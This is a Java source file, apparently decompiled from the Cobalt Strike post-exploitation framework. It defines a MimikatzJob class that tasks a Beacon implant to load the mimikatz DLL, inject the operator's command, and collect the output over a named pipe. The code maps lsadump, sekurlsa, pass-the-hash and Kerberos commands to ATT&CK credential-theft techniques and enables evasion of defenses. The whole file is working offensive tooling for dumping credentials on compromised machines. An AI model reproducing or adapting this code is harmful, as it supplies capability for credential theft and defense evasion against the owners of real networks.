package beacon.jobs;

import beacon.Job;
import beacon.TaskBeacon;
import common.CommonUtils;
import common.Packer;
import pe.PostExObfuscator;

public class MimikatzJob extends Job {
    protected String commandz;

    public MimikatzJob(TaskBeacon taskBeacon, String string) {
        super(taskBeacon);
        this.commandz = string;
    }

    public String getDescription() {
        return "Tasked beacon to run mimikatz's " + this.commandz + " command";
    }

    public String getShortDescription() {
        return "mimikatz " + this.commandz.split(" ")[0];
    }

    public String getDLLName() {
        return this.arch.equals("x64") ? "resources/mimikatz-full.x64.dll" : "resources/mimikatz-full.x86.dll";
    }

    public int getJobType() {
        return this.commandz.startsWith("@") ? 62 : 40;
    }

    public String getPipeName() {
        return "mimikatz";
    }

    public int getCallbackType() {
        return 32;
    }

    public int getWaitTime() {
        return 15000;
    }

    public byte[] fix(byte[] arrby) {
        Packer packer = new Packer();
        packer.addStringUTF8(this.commandz, 512);
        return CommonUtils.patch(arrby, "MIMIKATZ ABCDEFGHIJKLMNOPQRSTUVWXYZ", CommonUtils.bString(packer.getBytes()));
    }

    public String getTactic() {
        return CommonUtils.isin("lsadump::dcshadow", this.commandz) ? "T1207" : (CommonUtils.isin("sekurlsa::pth", this.commandz) ? "T1075" : (CommonUtils.isin("lsadump::", this.commandz) ? "T1003" : (CommonUtils.isin("kerberos::", this.commandz) ? "T1097" : (CommonUtils.isin("sekurlsa::", this.commandz) ? "T1003, T1055" : (CommonUtils.isin("sid::", this.commandz) ? "T1178" : "")))));
    }

    public void obfuscate(PostExObfuscator postExObfuscator, byte[] arrby) {
        postExObfuscator.enableEvasions();
    }
}
